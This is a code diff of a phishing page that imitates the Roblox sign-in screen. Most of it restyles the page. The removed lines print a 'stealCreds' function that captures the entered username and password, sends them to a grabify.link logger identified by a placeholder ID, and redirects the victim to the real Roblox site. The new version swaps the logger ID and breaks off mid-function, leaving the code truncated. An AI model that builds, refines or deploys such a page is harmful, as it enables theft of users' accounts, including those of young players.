@@ -6,9 +6,8 @@
     <title>Roblox</title>
     <style>
         body {
-            background-color: #232527;
-            color: white;
-            font-family: 'Gotham', 'Segoe UI', sans-serif;
+            background-color: #f2f4f5;
+            font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -16,56 +15,67 @@
             margin: 0;
         }
         .login-container {
-            background-color: #232527;
+            background-color: white;
             padding: 40px;
             border-radius: 8px;
             width: 320px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
             text-align: center;
-            box-shadow: 0 0 10px rgba(0,0,0,0.5);
         }
         .logo {
-            width: 180px;
+            width: 140px;
             margin-bottom: 20px;
         }
         h2 {
             margin-top: 0;
+            margin-bottom: 20px;
             font-size: 20px;
             font-weight: 600;
+            color: #393b3d;
+        }
+        .input-group {
+            text-align: left;
+            margin-bottom: 15px;
         }
         input {
             width: 100%;
             padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #e5e5e5;
-            border-radius: 5px;
+            border: 1px solid #a3b3c1;
+            border-radius: 6px;
             box-sizing: border-box;
             background-color: #f2f4f5;
-            font-size: 16px;
+            font-size: 14px;
+            outline: none;
+        }
+        input:focus {
+            border-color: #0074bd;
+            background-color: white;
         }
         button {
             width: 100%;
             padding: 12px;
-            background-color: #00b06f;
+            background-color: #0074bd; /* Modern Blue */
             color: white;
             border: none;
-            border-radius: 5px;
+            border-radius: 6px;
             font-weight: bold;
             font-size: 16px;
             cursor: pointer;
             margin-top: 10px;
+            transition: background 0.2s;
         }
         button:hover {
-            background-color: #009960;
+            background-color: #005a9e;
         }
         .spinner {
             display: none;
             margin: 10px auto;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #00b06f;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0074bd;
             border-radius: 50%;
             width: 20px;
             height: 20px;
-            animation: spin 2s linear infinite;
+            animation: spin 1s linear infinite;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
@@ -76,14 +86,18 @@
 <body>
 
 <div class="login-container">
-    <!-- Roblox Logo -->
+    <!-- Modern Roblox Logo -->
     <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="Roblox" class="logo">
     
     <h2>Sign In</h2>
     
     <form id="loginForm" onsubmit="stealCreds(event)">
-        <input type="text" id="username" name="username" placeholder="Username" required autocomplete="off">
-        <input type="password" id="password" name="password" placeholder="Password" required autocomplete="off">
+        <div class="input-group">
+            <input type="text" id="username" name="username" placeholder="Username" required autocomplete="off">
+        </div>
+        <div class="input-group">
+            <input type="password" id="password" name="password" placeholder="Password" required autocomplete="off">
+        </div>
         
         <button type="submit" id="loginBtn">Log In</button>
     </form>
@@ -93,32 +107,7 @@
 
 <script>
     // --- CONFIGURATION ---
-    // REPLACE THIS WITH YOUR GRABIFY ID (e.g., "AbC123D")
-    const grabifyID = "BTJ3IJ"; 
+    // REPLACE THIS WITH YOUR GRABIFY ID
+    const grabifyID = "TJDLGE"; 
     
-    function stealCreds(event) {
-        event.preventDefault();
-        
-        const user = document.getElementById('username').value;
-        const pass = document.getElementById('password').value;
-        
-        // UI Changes
-        document.getElementById('loginBtn').style.display = 'none';
-        document.getElementById('spinner').style.display = 'block';
-        
-        // 1. Send Data to Grabify
-        const url = `https://grabify.link/${grabifyID}?user=${encodeURIComponent(user)}&pass=${encodeURIComponent(pass)}`;
-        
-        fetch(url)
-            .then(response => console.log('Data sent'))
-            .catch(error => console.error('Error:', error));
-            
-        // 2. Redirect to Real Roblox
-        setTimeout(() => {
-            window.location.href = "https://www.roblox.com/home";
-        }, 1000);
-    }
-</script>
-
-</body>
-</html>
+    function stealCreds(event)
